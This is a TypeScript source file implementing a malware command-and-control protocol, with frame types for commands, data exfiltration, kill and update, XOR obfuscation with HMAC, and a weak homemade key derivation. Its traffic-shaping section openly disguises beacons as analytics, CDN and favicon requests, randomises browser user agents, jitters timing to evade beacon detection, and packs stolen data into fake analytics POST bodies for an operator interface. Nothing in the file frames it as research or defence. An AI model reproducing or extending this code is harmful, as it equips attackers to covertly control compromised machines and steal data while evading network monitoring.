// C2 Binary Protocol — XOR-keyed framing with HMAC-SHA256 authentication
// Frame layout (big-endian):
//   MAGIC(4) VERSION(1) TYPE(1) SEQNO(4) PAYLEN(4) | XOR(PAYLOAD)(N) | HMAC(32)
// Total overhead per frame: 46 bytes

export const MAGIC = new Uint8Array([0x49, 0x52, 0x4e, 0x57]); // IRNW
export const VERSION = 0x03;
export const HEADER_SIZE = 14;
export const HMAC_SIZE   = 32;

export const FrameType = {
  HEARTBEAT: 0x01,
  CMD:       0x02,
  RESPONSE:  0x03,
  EXFIL:     0x04,
  AUTH:      0x05,
  PROXY:     0x06,
  KILL:      0x07,
  UPDATE:    0x08,
  ACK:       0x09,
  ERROR:     0x0a,
} as const;
export type FrameType = typeof FrameType[keyof typeof FrameType];

export const FrameTypeName: Record<number, string> = {
  0x01: "HEARTBEAT",
  0x02: "CMD",
  0x03: "RESPONSE",
  0x04: "EXFIL",
  0x05: "AUTH",
  0x06: "PROXY",
  0x07: "KILL",
  0x08: "UPDATE",
  0x09: "ACK",
  0x0a: "ERROR",
};

export interface Frame {
  type:    FrameType;
  seq:     number;
  payload: Uint8Array;
  hmacOk:  boolean;
}

export interface FrameEncodeResult {
  bytes:   Uint8Array;
  hexDump: string;
}

function xorCipher(data: Uint8Array, key: Uint8Array): Uint8Array {
  const out = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i]! ^ key[i % key.length]!;
  return out;
}

// TypeScript 5.9+ requires a concrete ArrayBuffer (not ArrayBufferLike) for
// Web Crypto API calls. This helper ensures we always pass a fresh ArrayBuffer.
function toArrayBuffer(u: Uint8Array): ArrayBuffer {
  return u.buffer.slice(u.byteOffset, u.byteOffset + u.byteLength) as ArrayBuffer;
}

async function importHmacKey(keyBytes: Uint8Array): Promise<CryptoKey> {
  return crypto.subtle.importKey("raw", toArrayBuffer(keyBytes), { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
}

async function hmacSign(keyBytes: Uint8Array, data: Uint8Array): Promise<Uint8Array> {
  const k = await importHmacKey(keyBytes);
  return new Uint8Array(await crypto.subtle.sign("HMAC", k, toArrayBuffer(data)));
}

async function hmacVerify(keyBytes: Uint8Array, data: Uint8Array, sig: Uint8Array): Promise<boolean> {
  const k = await importHmacKey(keyBytes);
  return crypto.subtle.verify("HMAC", k, toArrayBuffer(sig), toArrayBuffer(data));
}

function toHexDump(bytes: Uint8Array): string {
  const lines: string[] = [];
  for (let off = 0; off < bytes.length; off += 16) {
    const chunk = bytes.slice(off, off + 16);
    const hex   = Array.from(chunk).map(b => b.toString(16).padStart(2, "0")).join(" ");
    const asc   = Array.from(chunk).map(b => b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : ".").join("");
    lines.push(`${off.toString(16).padStart(8, "0")}  ${hex.padEnd(47)}  |${asc}|`);
  }
  return lines.join("\n");
}

// key must be 64 bytes: first 32 = XOR key, last 32 = HMAC key
export async function encodeFrame(
  type:    FrameType,
  payload: Uint8Array,
  key:     Uint8Array,
  seq:     number,
): Promise<FrameEncodeResult> {
  const xorKey  = key.slice(0, 32);
  const hmacKey = key.slice(32, 64);

  const encPayload = xorCipher(payload, xorKey);

  const header = new Uint8Array(HEADER_SIZE);
  header.set(MAGIC, 0);
  header[4] = VERSION;
  header[5] = type;
  const dv = new DataView(header.buffer);
  dv.setUint32(6,  seq,             false);
  dv.setUint32(10, encPayload.length, false);

  const toSign = new Uint8Array(HEADER_SIZE + encPayload.length);
  toSign.set(header,      0);
  toSign.set(encPayload,  HEADER_SIZE);

  const hmac = await hmacSign(hmacKey, toSign);

  const frame = new Uint8Array(toSign.length + HMAC_SIZE);
  frame.set(toSign, 0);
  frame.set(hmac,   toSign.length);

  return { bytes: frame, hexDump: toHexDump(frame) };
}

export async function decodeFrame(
  data: Uint8Array,
  key:  Uint8Array,
): Promise<Frame | null> {
  if (data.length < HEADER_SIZE + HMAC_SIZE) return null;

  for (let i = 0; i < 4; i++) {
    if (data[i] !== MAGIC[i]) return null;
  }

  const dv      = new DataView(data.buffer, data.byteOffset);
  const type    = data[5] as FrameType;
  const seq     = dv.getUint32(6,  false);
  const payLen  = dv.getUint32(10, false);

  const expectedLen = HEADER_SIZE + payLen + HMAC_SIZE;
  if (data.length < expectedLen) return null;

  const body    = data.slice(0, HEADER_SIZE + payLen);
  const hmacSig = data.slice(HEADER_SIZE + payLen, HEADER_SIZE + payLen + HMAC_SIZE);

  const hmacKey  = key.slice(32, 64);
  const hmacOk   = await hmacVerify(hmacKey, body, hmacSig);

  const xorKey     = key.slice(0, 32);
  const encPayload = data.slice(HEADER_SIZE, HEADER_SIZE + payLen);
  const payload    = xorCipher(encPayload, xorKey);

  return { type, seq, payload, hmacOk };
}

export function parseFramePayload(payload: Uint8Array): unknown {
  try {
    return JSON.parse(new TextDecoder().decode(payload));
  } catch {
    return { raw: Array.from(payload).map(b => b.toString(16).padStart(2, "0")).join(" ") };
  }
}

export function buildPayload(obj: unknown): Uint8Array {
  return new TextEncoder().encode(JSON.stringify(obj));
}

export function deriveKey(passphrase: string): Uint8Array {
  // PBKDF2-style derivation using Web Crypto — synchronous approximation via XOR stretch
  // For a real deployment, use pbkdf2 (async). Here we do a deterministic 64-byte key from passphrase.
  const enc     = new TextEncoder().encode(passphrase);
  const keyOut  = new Uint8Array(64);
  const rounds  = [0x49, 0x52, 0x4e, 0x57, 0xde, 0xad, 0xc0, 0xde];

  for (let b = 0; b < 64; b++) {
    let v = rounds[b % 8]!;
    for (let i = 0; i < enc.length; i++) v = ((v << 3) | (v >>> 5)) ^ enc[i]!;
    v ^= (b * 0xab) & 0xff;
    keyOut[b] = v & 0xff;
  }
  return keyOut;
}

export function randomKey(): Uint8Array {
  const k = new Uint8Array(64);
  crypto.getRandomValues(k);
  return k;
}

// ─── TRAFFIC SHAPING HELPERS ──────────────────────────────────────────────────

/** Randomized browser-like User-Agent strings for HTTP beacon disguise */
export const BROWSER_USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
] as const;

/** Pick a random User-Agent for each request */
export function randomUserAgent(): string {
  return BROWSER_USER_AGENTS[Math.floor(Math.random() * BROWSER_USER_AGENTS.length)]!;
}

/** Jittered sleep — evades periodic-beacon detection by adding noise to timing */
export function beaconJitter(baseMs: number, spreadFactor = 0.5): number {
  const spread = baseMs * spreadFactor;
  return Math.floor(baseMs - spread + Math.random() * spread * 2);
}

/** Disguise beacon URL as a common analytics/CDN path */
export function disguiseBeaconPath(token: string, seq: number): string {
  const paths = [
    `/cdn-cgi/beacon/expect-ct?t=${token}&s=${seq}`,
    `/analytics/v1/collect?cid=${token}&seq=${seq}`,
    `/favicon.ico?v=${token}&c=${seq}`,
    `/api/telemetry?session=${token}&n=${seq}`,
    `/pixel.gif?uid=${token}&e=pageview&seq=${seq}`,
    `/metrics/heartbeat?id=${token}&seq=${seq}`,
    `/__utm.gif?utmwv=5&utmn=${token}&utmp=/${seq}`,
  ];
  return paths[(Date.now() + seq) % paths.length]!;
}

/** Generate realistic Accept/Content-Type headers to mimic browser traffic */
export function browserHeaders(refererHost = ""): Record<string, string> {
  return {
    "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language":  "en-US,en;q=0.9",
    "Accept-Encoding":  "gzip, deflate, br",
    "Cache-Control":    "no-cache",
    "Connection":       "keep-alive",
    "Pragma":           "no-cache",
    "Sec-Fetch-Dest":   "empty",
    "Sec-Fetch-Mode":   "cors",
    "Sec-Fetch-Site":   refererHost ? "cross-site" : "same-origin",
    ...(refererHost ? { "Referer": `https://${refererHost}/`, "Origin": `https://${refererHost}` } : {}),
  };
}

/** Wrap exfil payload as a fake analytics POST body */
export function packAsAnalyticsPayload(token: string, data: Uint8Array): string {
  const b64 = btoa(String.fromCharCode(...Array.from(data)));
  return `cid=${encodeURIComponent(token)}&t=event&ec=perf&ea=lcp&el=${encodeURIComponent(b64)}&ev=1`;
}

/** Multi-protocol channel descriptor for operator UI */
export interface ChannelDescriptor {
  protocol: "raw-tcp" | "http" | "http-analytics" | "dns-txt";
  path:     string;
  headers:  Record<string, string>;
  ua:       string;
  jitterMs: number;
}

export function buildChannelDescriptor(host: string, port: number, seq: number): ChannelDescriptor[] {
  const ua = randomUserAgent();
  return [
    {
      protocol: "raw-tcp",
      path:     `${host}:${port}`,
      headers:  {},
      ua:       "",
      jitterMs: beaconJitter(5000),
    },
    {
      protocol: "http-analytics",
      path:     `http://${host}:${port}${disguiseBeaconPath("TOKEN", seq)}`,
      headers:  { ...browserHeaders(host), "User-Agent": ua },
      ua,
      jitterMs: beaconJitter(8000, 0.6),
    },
    {
      protocol: "http",
      path:     `http://${host}:${port}/api/telemetry`,
      headers:  { ...browserHeaders(), "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded" },
      ua,
      jitterMs: beaconJitter(10000, 0.7),
    },
  ];
}

export function keyToHex(key: Uint8Array): string {
  return Array.from(key).map(b => b.toString(16).padStart(2, "0")).join("");
}

export function hexToKey(hex: string): Uint8Array {
  const clean = hex.replace(/\s+/g, "").slice(0, 128).padEnd(128, "0");
  const bytes = new Uint8Array(64);
  for (let i = 0; i < 64; i++) bytes[i] = parseInt(clean.slice(i * 2, i * 2 + 2), 16);
  return bytes;
}
